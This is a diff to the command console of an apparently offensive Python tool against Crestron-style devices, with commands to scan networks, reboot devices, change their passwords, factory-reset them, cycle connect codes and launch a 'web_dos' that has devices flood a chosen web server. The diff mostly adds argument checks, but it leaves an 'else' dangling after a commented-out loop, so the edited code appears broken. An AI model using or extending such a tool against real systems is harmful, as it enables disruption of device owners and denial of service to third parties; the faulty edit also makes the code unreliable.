@@ -85,8 +85,8 @@ while True:
 			print(" Example: reboot username password\n")
 		elif command_input[1] == 'pass_change':
 			print(" This function will change the password of live hosts")
-			print(" To run, type \'pass_change\' followed by a username, the password, and the new password")
-			print(" Example: pass_change username oldpass newpass\n")
+			print(" To run, type \'pass_change\' followed by the host, a username, the password, and the new password")
+			print(" Example: pass_change 10.10.10.10 username oldpass newpass\n")
 		elif command_input[1] == 'restore':
 			print(" This function will restore the device to factor default")
 			print(" To run, type \'restore\' followed by the targer ip")
@@ -94,7 +94,7 @@ while True:
 		elif command_input[1] == 'web_dos':
 			print(" This funciton will begin sending arbitrary web requests to the target machine")
 			print(" To run, type \'web_dos\' followed by the systems ip, username, password, and the target web server")
-			print(" Example: web_dos 10.10.10.10 username password wbteach.com\n")
+			print(" Example: web_dos 10.10.10.10 username password http://wbteach.com\n")
 		elif command_input[1] == 'code_cycle':
 			print(" This function will begin changing the connect code as quickly as the system will allow")
 			print(" To run, type \'code_cycle\' followed by an IP, the username, and the password")
@@ -102,21 +102,27 @@ while True:
 	
 	#Clear the Screen if its feeling too cluttered
 	elif command_input[0] == 'clear':
-		print('\n' * 40)
+		print(' >\n' * 100)
 
 	#Get the user input for the network scan
 	elif command_input[0] == 'network_scan':
 		#Grab the ip range for the scan
-		ip_range = command_input[1]
-		#Scan network and return the live hosts
-		live_hosts = creston.network_scan(ip_range)
+		if len(command_input) < 2:
+			print("Please specify an IP range")
+		else:
+			ip_range = command_input[1]
+			#Scan network and return the live hosts
+			live_hosts = creston.network_scan(ip_range)
 	
 	#Get the user input to manually add a host
 	elif command_input[0] == 'add_host':
 		#Grab the host IP to add
-		live = command_input[1]
-		#Add the specified IP
-		live_hosts.append(live)
+		if len(command_input) < 2:
+			print("Please specify a host")
+		else:
+			live = command_input[1]
+			#Add the specified IP
+			live_hosts.append(live)
 		
 	#Print out all live hosts
 	elif command_input[0] == 'print_hosts':
@@ -138,22 +144,29 @@ while True:
 	#Grab the user input for a reboot
 	elif command_input[0] == 'reboot':
 		#Grab username and password for input
-		username = command_input[1]
-		password = command_input[2]
-		#loop through hosts and start rebooting
-		for hosts in model_dict:
-			creston.reboot(hosts,model_dict[hosts],username,password)
-	
+		if len(command_input) < 3:
+			print("Please enter a username and password")
+		else:
+			username = command_input[1]
+			password = command_input[2]
+			#loop through hosts and start rebooting
+			for hosts in model_dict:
+				creston.reboot(hosts,model_dict[hosts],username,password)
+
 	#Grab the user input for a pass change
 	elif command_input[0] == 'pass_change':
-		#Grab username, current password, and new password
-		username = command_input[1]
-		password = command_input[2]
-		newpass = command_input[3]
-		#Run through change passwordds based on the model
-		for hosts in model_dict:
-			if model_dict[hosts] == 'OG':
-				creston.change_pass(hosts,model_dict[hosts],username,password,newpass)
+		if len(command_input) < 5:
+			print("Please enter the host, username, password, and new password")
+		else:
+			#Grab username, current password, and new password
+			host = command_input[1]
+			username = command_input[2]
+			password = command_input[3]
+			newpass = command_input[4]
+			#Run through change passwordds based on the model
+			#for host in model_dict:
+			if model_dict[host] == 'OG':
+				creston.change_pass(host,username,password,newpass)
 			else:
 				pass
 	#Grab the input and perform a factory restore
@@ -165,17 +178,23 @@ while True:
 	#Begin sending web requests form the projects
 	#This is a proof of concept and does not contianully send requets
 	elif command_input[0] == 'web_dos':
-		#Grab host, username, password, and webserver
-		host = command_input[1]
-		username = command_input[2]
-		password = command_input[3]
-		webserver = command_input[4]
-		creston.web_dos(host,username,password,webserver)
+		if len(command_input) < 5:
+			print("Please enter a host, username, password, and url")
+		else:
+			#Grab host, username, password, and webserver
+			host = command_input[1]
+			username = command_input[2]
+			password = command_input[3]
+			webserver = command_input[4]
+			creston.web_dos(host,username,password,webserver)
 	elif command_input[0] == 'code_cycle':
-		host = command_input[1]
-		username = command_input[2]
-		password = command_input[3]
-		creston.code_cycle(host,username,password)
+		if len(command_input) < 4:
+			print("Please enter a host, username, password")
+		else:
+			host = command_input[1]
+			username = command_input[2]
+			password = command_input[3]
+			creston.code_cycle(host,username,password)
 	#Quit the program
-	elif command_input == 'exit':
+	elif command_input[0] == 'exit':
 		exit()
